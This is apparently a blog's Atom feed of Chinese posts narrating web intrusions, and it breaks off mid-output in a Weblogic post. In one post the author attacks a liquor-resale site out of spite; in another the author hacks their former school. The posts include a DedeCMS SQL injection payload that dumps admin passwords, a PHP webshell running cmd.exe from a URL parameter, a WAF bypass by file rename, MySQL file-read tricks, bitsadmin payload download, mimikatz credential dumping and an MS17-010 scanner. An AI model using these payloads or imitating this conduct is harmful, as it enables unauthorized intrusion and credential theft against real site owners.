<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hone</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="OneHone.github.io/"/>
  <updated>2018-07-12T01:25:34.835Z</updated>
  <id>OneHone.github.io/</id>
  
  <author>
    <name>Hone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次渗透测试</title>
    <link href="OneHone.github.io/2018/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>OneHone.github.io/2018/07/11/记一次渗透测试/</id>
    <published>2018-07-11T09:01:59.000Z</published>
    <updated>2018-07-12T01:25:34.835Z</updated>
    
    <content type="html"><![CDATA[<p>湖人总冠军！<br><a id="more"></a></p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近手里有瓶茅台酒，打算拿出去卖，于是上网搜高价回收烟酒，加了个卖家，聊了几句，发现对方态度不咋滴，收购价也低（后来知道这货比同行收购价少了四百块）。本着正义，对该网站进行了测试。<br>目标：<code>www.a.com</code></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口:80</span><br><span class="line">旁站：www.b.com www.c.com(实际中还有三个旁站，但没啥利用，就不写了)</span><br><span class="line">通过页面报错可知：iis7.5+win08</span><br></pre></td></tr></table></figure><h3 id="怼"><a href="#怼" class="headerlink" title="怼"></a>怼</h3><p>对a.com进行了测试，并未发现web层面上的漏洞，于是转向旁站。<br>对旁站b.com测试发现，该网站采用了<code>phpwebCMS</code>， 该cms的某些版本存在万能钥匙<br><img src="/images/记一次渗透测试/1.PNG" alt=""><br>想进后台？不存在的。第二个突破点是该后台还可以用burp爆破，页面不刷新验证码就不会变，挂了top1000的字典没跑出来，爆破看人品~。<br>接下来对c.com测试，输入<code>robots.txt</code><br><img src="/images/记一次渗透测试/2.PNG" alt=""><br>熟悉不过了，dedecms，输入/dede，跳到管理后台<br><img src="/images/记一次渗透测试/3.PNG" alt=""><br>版本：<code>Dedev57</code> 想到之前有段代码能把管理员的账号密码给爆出来，于是试了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\&apos; or mid=@`\&apos;` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`#@__admin` limit+0,1),5,6,7,8,9#@`\&apos;`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294</span><br></pre></td></tr></table></figure></p><p>结果被waf拦了<br><img src="/images/记一次渗透测试/4.PNG" alt=""><br>没办法，回到dede后台，尝试弱口令无果之后，就结合域名猜，猜了好久，记得当时是晚上十一点多，已经到了撩螺的时间，心想再试最后一分钟，没想到还真试出来了，密码：域名+0000<br><img src="/images/记一次渗透测试/5.PNG" alt=""><br>皮~，通过文件管理器将马子传上去，结果又被waf拦了<br><img src="/images/记一次渗透测试/6.PNG" alt=""><br>好吧，放弃撩螺时间，怼。<br>传php内容为一句话，杀<br>传php内容为1，杀<br>传txt内容为一句话，不杀<br>Dede有文件改名功能，所以把一句话写入txt，将txt改名为php即可绕过waf(尴尬)<br><img src="/images/记一次渗透测试/7.PNG" alt=""><br>上刀！<br><img src="/images/记一次渗透测试/8.PNG" alt=""><br>不想被查水表，所以打码狠点</p><h2 id="有点意思"><a href="#有点意思" class="headerlink" title="有点意思"></a>有点意思</h2><p>菜刀执行cmd：<br><img src="/images/记一次渗透测试/9.PNG" alt=""><br>发现报错，响应也看不懂<br>本站支持的脚本为：php，asp，针对该环境整理一下提权思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找个可写可读目录，上传cmd.txt，执行命令（这里运行之后提示缺少对象或者文件未找到（路径是对的），当时没截图，就不打算写了）</span><br><span class="line">通过php进行提权，看是否能绕过disabled_function，进行命令执行。第二生成msf的php马，进行命令执行</span><br><span class="line">通过asp进行提权，用asp的cmd马执行命令。第二生成msf的asp马，进行命令执行</span><br><span class="line">通过mysql进行提权，读取配置文件，找root密码，进行udf，mof提权</span><br><span class="line">代理出来，通过ms17-010</span><br></pre></td></tr></table></figure></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>首先通过<code>phpinfo</code>查看禁止了哪些函数以及是否为安全模式<br><img src="/images/记一次渗透测试/10.PNG" alt=""><br><img src="/images/记一次渗透测试/11.PNG" alt=""><br>安全模式为off，没有禁掉exec_shell，可以用该函数执行命令<br><img src="/images/记一次渗透测试/12.PNG" alt=""><br>报错？难道姿势不对？那换种姿势看看<br><img src="/images/记一次渗透测试/13.PNG" alt=""><br>一脸懵逼？？什么情况？？<br>这时候想到了另外一种方法，那就是调用com组件会不会成功？这里用了t00ls分享的技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  </span><br><span class="line">$exec=$phpwsh-&gt;exec(&quot;cmd.exe /c &quot;.$_GET[&apos;c&apos;].&quot;&quot;);  </span><br><span class="line">$stdout = $exec-&gt;StdOut();  </span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();  </span><br><span class="line">echo $stroutput;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在本地测试没问题，一丢到目标机子运行就报错：wscript.shell拒绝访问<br><img src="/images/记一次渗透测试/14.PNG" alt=""><br>啊！<br>换了各种大马也没见奇效！皮有点硬啊！<br>最后试一下反弹个msf的<code>shell</code>回来看看能不能执行命令和执行<code>exe</code><br><img src="/images/记一次渗透测试/15.PNG" alt=""><br>进程列不出，<code>shell</code>也进不去。尝试运行<code>exe</code><br><img src="/images/记一次渗透测试/16.PNG" alt=""><br>也不行，皮。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>接下来试试<code>asp</code>能不能执行命令，首先上传cmd马运行，结果报错：Server.CreateObject调用失败，对象访问被拒绝。<br><img src="/images/记一次渗透测试/17.PNG" alt=""><br>我记得asp执行系统命令都会调用这函数的吧？之后也是换各种asp大马，cmd马都不行，提示缺少对象，调用<code>Shell.application</code>组件也不行。不支持<code>aspx</code><br>同样试一下<code>asp</code>的<code>msf</code>马，结果。。。<br><img src="/images/记一次渗透测试/18.PNG" alt=""></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>其次就是翻各种配置文件了，因为没权限，目录卡的很死，只能看dedeCMS目录结构下的文件，理所当然的只能读到<code>mysql</code>低权限的<code>dede</code>用户，在<code>common.inc.php</code>读取数据账号密码<br>这里用到的是低用户读取<code>user.MYD</code>文件，从而读到<code>root</code>密码，用低用户链接数据，执行<code>select @@datadir;</code>查询读取数据库路径<br><img src="/images/记一次渗透测试/19.PNG" alt=""><br>所以<code>user.MYD</code>为<code>D:\mysql\Data\mysql\user.MYD</code><br>接下来开始读取<code>root</code>密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table `a` ( `content` LONGTEXT );</span><br><span class="line">LOAD DATA LOCAL INFILE &apos;D:\\mysql\\Data\\mysql\\user.MYD&apos; INTO TABLE `a` fields terminated by &apos;&apos; LINES TERMINATED BY &apos;\0&apos;;</span><br><span class="line">select `content` from `a`;</span><br></pre></td></tr></table></figure></p><p><img src="/images/记一次渗透测试/20.PNG" alt=""><br>找不到user表？太炸了，讲真最惨的时候也只是读不出完整root密码而已，炸了炸了。这里有个问题，用户能链接到数据库，那肯定有个表存放着账号。我认为目标可能把user表给改名了，可又没有方法验证是不是这样。一般人也不会改这东西啊，奇怪了。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>通过<code>reGeorg</code>代理，打445端口，结果也凉了，就不截图了</p><h2 id="怼不过"><a href="#怼不过" class="headerlink" title="怼不过"></a>怼不过</h2><p>目前并没有好的方法（有什么好技巧，可以私聊我），看看以后能不能找到某种方式执行命令，可以的话就写个提权文章补上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;湖人总冠军！&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透自己的母校</title>
    <link href="OneHone.github.io/2018/06/12/%E6%B8%97%E9%80%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AF%8D%E6%A0%A1/"/>
    <id>OneHone.github.io/2018/06/12/渗透自己的母校/</id>
    <published>2018-06-12T06:01:49.000Z</published>
    <updated>2018-06-13T01:57:08.391Z</updated>
    
    <content type="html"><![CDATA[<p>起初的梦想都是黑掉自己的学校吧。<br><a id="more"></a><br>正如上面所说，一直想再一次拿到学校的shell，但最近在忙于别的事情，始终没有好的时间静下心来渗透自己的母校，这几天抽空完成了一图角，顺便写个实录。</p><h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>结合主站、C段、旁站、二级域名和端口的思路一顿乱操作发现了一处后台管理登入框存在弱口令<br><img src="/images/渗透自己的母校/1.PNG" alt=""><br>后台没有备份功能，接下来找上传点把<code>shell</code>传上去<br><img src="/images/渗透自己的母校/2.PNG" alt=""><br>后台没有多的上传点，唯独只有<code>KindEditor</code>编辑器上传功能，看到版本号已经凉了，这编辑器高版本简直无敌，之前遇到好几个都没拿下来，但这次不一样，我甚至没有过多的操作，看到版本号就溜了~</p><h2 id="中"><a href="#中" class="headerlink" title="中"></a>中</h2><p>后台没有成功拿到<code>shell</code>后又忙了几天，今天无意在浏览器的标签页看到了这网站，于是又重新审视了一番，扫描端口发现了该<code>IP</code>开了挺多的<code>web服务</code>，其中有<code>apache+tomcat</code> <code>nginx</code> <code>apache+php</code>逐个访问端口，没有发现<code>web</code>层面上的漏洞，之后在xxx端口访问到一处登入框<br><img src="/images/渗透自己的母校/3.PNG" alt=""><br>尝试弱口令无果，难道非要我祭出100w+的字典爆破！？<br>在验证账密密码过后，<code>url</code>变成了<code>http://www.xxx.xxx/login.action</code><br><img src="/images/渗透自己的母校/4.PNG" alt=""><br>记得在学校的时候老师讲<code>struts2</code>可厉害了，怪我是个差学生，不好好听课。<br>言归正传，<code>xxx.action、xxx.do</code>这些后缀是典型的<code>struts2</code>框架啊，立马用脚本验证了下，果真存在漏洞。<br><img src="/images/渗透自己的母校/5.PNG" alt=""><br>执行命令，收集目标机的情况<br><img src="/images/渗透自己的母校/6.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami --&gt;system权限</span><br><span class="line">ipconfig --&gt;公网IP</span><br><span class="line">tasklist --&gt;无杀软无狗（惊了）</span><br><span class="line">3389 --&gt;开</span><br></pre></td></tr></table></figure></p><p>上cs<br><img src="/images/渗透自己的母校/7.PNG" alt=""><br>加载<code>mimikatz</code>获取明文<br><img src="/images/渗透自己的母校/8.PNG" alt=""><br>上传一句话<br><img src="/images/渗透自己的母校/9.PNG" alt=""><br>页面报错，没关系，直接用菜刀链<br><img src="/images/渗透自己的母校/10.PNG" alt=""><br>菜刀报错，没关系，换把刀<br><img src="/images/渗透自己的母校/11.PNG" alt=""><br>OK 继续下去，还没完，远程登入进去<br><img src="/images/渗透自己的母校/12.PNG" alt=""><br>数据库<br><img src="/images/渗透自己的母校/13.PNG" alt=""><br>打算往内网走，但内网没别的机器。<br><img src="/images/渗透自己的母校/14.PNG" alt=""></p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>后续<br><img src="/images/渗透自己的母校/15.PNG" alt=""><br>呵</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;起初的梦想都是黑掉自己的学校吧。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP版ms17-010</title>
    <link href="OneHone.github.io/2018/05/28/PHP%E7%89%88ms17-010/"/>
    <id>OneHone.github.io/2018/05/28/PHP版ms17-010/</id>
    <published>2018-05-28T12:09:57.000Z</published>
    <updated>2018-05-28T12:24:02.215Z</updated>
    
    <content type="html"><![CDATA[<p>这么晚了，还没回家。<br><a id="more"></a><br>内网渗透扫描<code>ms17-010</code>脚本，比较方便快捷，无需其他插件。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//根据巡风python代码翻译成PHP代码</span><br><span class="line">//2017.08.03 by ice &amp;&amp; By T00ls.Net；</span><br><span class="line">@error_reporting(7);</span><br><span class="line">if(@$_GET[&apos;host&apos;])&#123;</span><br><span class="line">        $host=trim($_GET[&apos;host&apos;]);</span><br><span class="line">        if(ms17010($host,445))&#123;</span><br><span class="line">                echo &apos;&lt;span style=&quot;color:#F00&quot;&gt;[+] Vulnerability!&lt;/span&gt;&apos;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                echo &apos;&lt;span style=&quot;color:#000&quot;&gt;[-] No Vulnerability!&lt;/span&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &apos;&lt;br&gt;[+] OS: &lt;span style=&quot;color:#666&quot;&gt;&apos;.smbos($host,445).&quot;&lt;/span&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function get_tree_connect_request($ip,$tree_id)&#123;</span><br><span class="line">        $ipc=&apos;005c5c&apos;.bin2hex($ip).&apos;5c49504324003f3f3f3f3f00&apos;;</span><br><span class="line">        $ipc_len_hex=bin2hex(pack(&apos;s&apos;,strlen($ipc)/2));</span><br><span class="line">        $data=&apos;ff534d4275000000001801280000000000000000000000000000729c&apos;.$tree_id.&apos;c4e104ff00000000000100&apos;.$ipc_len_hex.$ipc;</span><br><span class="line">        $tree=&apos;000000&apos;.bin2hex(pack(&apos;s&apos;,strlen($data)/2)).$data;</span><br><span class="line">        $data5=pack(&apos;H*&apos;,$tree);</span><br><span class="line">        return $data5;</span><br><span class="line">&#125;</span><br><span class="line">function ms17010($host,$port)&#123;</span><br><span class="line">        $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port;</span><br><span class="line">        $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT);</span><br><span class="line">        if ($sock)&#123;</span><br><span class="line">                $data1=pack(&apos;H*&apos;,&apos;00000054ff534d4272000000001801280000000000000000000000000000729c0000c4e1003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200&apos;);</span><br><span class="line">                fwrite($sock,$data1);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $data2=pack(&apos;H*&apos;,&apos;0000008fff534d4273000000001801280000000000000000000000000000729c0000c4e10cff000000dfff0200010000000000310000000000d400008054004e544c4d5353500001000000050208a2010001002000000010001000210000002e3431426c7441314e505974624955473057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data2);</span><br><span class="line">                $data2_data=fread($sock, 1024);</span><br><span class="line">                $user_id=substr(bin2hex($data2_data),64,4);</span><br><span class="line">                $data3=pack(&apos;H*&apos;,&apos;00000150ff534d4273000000001801280000000000000000000000000000729c&apos;.$user_id.&apos;c4e10cff000000dfff0200010000000000f200000000005cd0008015014e544c4d53535000030000001800180040000000780078005800000002000200d000000000000000d200000020002000d200000000000000f2000000050208a2ec893eacfc70bba9afefe94ef78908d37597e0202fd6177c0dfa65ed233b731faf86b02110137dc50101000000000000004724eed7b8d2017597e0202fd6177c0000000002000a0056004b002d005000430001000a0056004b002d005000430004000a0056004b002d005000430003000a0056004b002d00500043000700080036494bf1d7b8d20100000000000000002e003400310042006c007400410031004e005000590074006200490055004700300057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data3);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $data4=pack(&apos;H*&apos;,&apos;00000063ff534d4273000000001801200000000000000000000000000000729c0000c4e10dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data4);</span><br><span class="line">                $data4_data=fread($sock, 1024);</span><br><span class="line">                $newuser_id=substr(bin2hex($data4_data),64,4);</span><br><span class="line">                $data5=get_tree_connect_request($host,$newuser_id);</span><br><span class="line">                fwrite($sock,$data5);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $poc=pack(&apos;H*&apos;,&apos;0000004aff534d422500000000180128000000000000000000000000&apos;.$user_id.&apos;729c&apos;.$newuser_id.&apos;c4e11000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00&apos;);</span><br><span class="line">                fwrite($sock,$poc);</span><br><span class="line">                $poc_data=fread($sock, 1024);</span><br><span class="line">                if(substr(bin2hex($poc_data),18,8) == &apos;050200c0&apos;)&#123;</span><br><span class="line">                        return true;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">function smbos($host,$port)&#123;</span><br><span class="line">        $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port;</span><br><span class="line">        $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT);</span><br><span class="line">        if ($sock)&#123;</span><br><span class="line">                $payload1=pack(&apos;H*&apos;,&apos;00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;);</span><br><span class="line">                $payload2=pack(&apos;H*&apos;,&apos;0000010aff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a2000000000000000000000000000000000502ce0e0000000f00570069006e0064006f0077007300200053006500720076006500720020003200300030003300200033003700390030002000530065007200760069006300650020005000610063006b002000320000000000570069006e0064006f0077007300200053006500720076006500720020003200300030003300200035002e00320000000000&apos;);</span><br><span class="line">                fwrite($sock,$payload1);</span><br><span class="line">                $out1=fread($sock, 1024);</span><br><span class="line">                fwrite($sock,$payload2);</span><br><span class="line">                $out2=fread($sock, 1024);</span><br><span class="line">                $blob_len_arr=unpack(&apos;s&apos;,substr($out2,36+7,2));</span><br><span class="line">                $osarr=explode(chr(0),iconv(&apos;UTF-16LE&apos;,&apos;UTF-8&apos;,substr($out2,36+11+$blob_len_arr[1])));</span><br><span class="line">                return $osarr[0].&apos;|&apos;.$osarr[1];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx/ms17-010.php?host=IP</span><br></pre></td></tr></table></figure><p><img src="/images/PHP版ms17-010/1.PNG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这么晚了，还没回家。&lt;br&gt;
    
    </summary>
    
      <category term="系统漏洞" scheme="OneHone.github.io/categories/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ms17-010" scheme="OneHone.github.io/tags/ms17-010/"/>
    
  </entry>
  
  <entry>
    <title>读取lsass.dmp报错</title>
    <link href="OneHone.github.io/2018/05/23/%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99/"/>
    <id>OneHone.github.io/2018/05/23/读取lsass-dmp文件报错/</id>
    <published>2018-05-23T06:06:20.000Z</published>
    <updated>2018-05-24T03:34:59.651Z</updated>
    
    <content type="html"><![CDATA[<p>最近抓系统hash的时候，遇到了些问题。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标机：windows 2003 X86</span><br></pre></td></tr></table></figure></p><h2 id="破解lsass-dmp"><a href="#破解lsass-dmp" class="headerlink" title="破解lsass.dmp"></a>破解lsass.dmp</h2><p>首先利用<code>procdump获取到lsass.dmp</code>，运用<code>mimikatz.exe</code>解密该文件。注：32位就用32位的<code>mimikatz</code>破，同理64位的也是。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p><p>结果发现报错：<br><img src="/images/读取lsass-dmp文件报错/1.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;MajorVersion (5) != MIMIKATZ_NT_MAJOR_VERSION (6)</span><br></pre></td></tr></table></figure></p><p>查阅网上资料，原来破解lsass.dmp文件是需要系统内核版本一一对应的。比如在<code>win03</code>系统上获取到<code>lsass.dmp</code>文件要在<code>win03</code>下运行<code>mimikatz</code>破解，当然了在<code>xp</code>下运行<code>mimikatz</code>破解也是可以的，只要内核版本一样就行。<br><img src="/images/读取lsass-dmp文件报错/2.PNG" alt=""></p><p>于是换了台机器成功破解<code>lsass.dmp</code><br><img src="/images/读取lsass-dmp文件报错/3.PNG" alt=""><br>抓系统hash不限于该方法，从注册表里导出hash也是不错的选择。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近抓系统hash的时候，遇到了些问题。&lt;br&gt;
    
    </summary>
    
      <category term="hash" scheme="OneHone.github.io/categories/hash/"/>
    
    
      <category term="hash" scheme="OneHone.github.io/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title> net view命令 6118报错 </title>
    <link href="OneHone.github.io/2018/05/15/net%20view%E5%91%BD%E4%BB%A4%206118%E6%8A%A5%E9%94%99/"/>
    <id>OneHone.github.io/2018/05/15/net view命令 6118报错/</id>
    <published>2018-05-15T02:10:18.000Z</published>
    <updated>2018-05-15T06:40:31.368Z</updated>
    
    <content type="html"><![CDATA[<p>小记<br><a id="more"></a><br>在一次测试中执行了<code>net view /domain</code>命令发现报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System error 6118 has occurred.</span><br><span class="line">The list of servers for this workgroup is not currently available</span><br></pre></td></tr></table></figure></p><p><img src="/images/net view命令 6118报错/1.PNG" alt=""></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>开启<code>Browser</code>服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Browser config start=aoto</span><br><span class="line">sc start Browser</span><br></pre></td></tr></table></figure></p><p>执行完可能需要等几分钟才能执行<code>net view</code>命令</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小记&lt;br&gt;
    
    </summary>
    
      <category term="系统命令" scheme="OneHone.github.io/categories/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="系统命令" scheme="OneHone.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案-3</title>
    <link href="OneHone.github.io/2018/04/12/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-3/"/>
    <id>OneHone.github.io/2018/04/12/Weblogic引发的血案-3/</id>
    <published>2018-04-12T07:55:48.000Z</published>
    <updated>2018-04-13T03:22:34.458Z</updated>
    
    <content type="html"><![CDATA[<p>无状态<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上上篇文章一样。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;BX1</span><br><span class="line">systeminfo --&gt;Windows Server 2012 R2 Standard 169补丁</span><br><span class="line">ipconfig --&gt;192.168.2.23 </span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户属于管理员组，同时不确定管理员组里帐号（kxadmin）是不是域管</span><br><span class="line">tasklist --&gt;WRSA.exe Webroot杀软(一开始没注意到这线程，以为没杀软，绕了点弯路)</span><br><span class="line">所属域 --&gt;Kx</span><br></pre></td></tr></table></figure><p><img src="/images/Weblogic引发的血案-3/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>像开始说的，我是没有注意到<code>WRSA.exe</code>这款杀软，但是习惯性的用了<code>Veil生成msf的exp</code>，恰好又能过（virustotal.com）<br><img src="/images/Weblogic引发的血案-3/2.PNG" alt=""><br>利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-3/3.PNG" alt=""><br><code>msf</code>监听并反弹<code>meterpreter的shell</code><br><img src="/images/Weblogic引发的血案-3/4.PNG" alt=""><br>这里和 Weblogic引发的血案-2有点像，哈哈哈，入口点都一样。</p><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>先收集一下域信息，找找域管，找找域控。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:kx 查看域控</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net group &quot;Domain Admins&quot; /domain</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain Kx.</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span 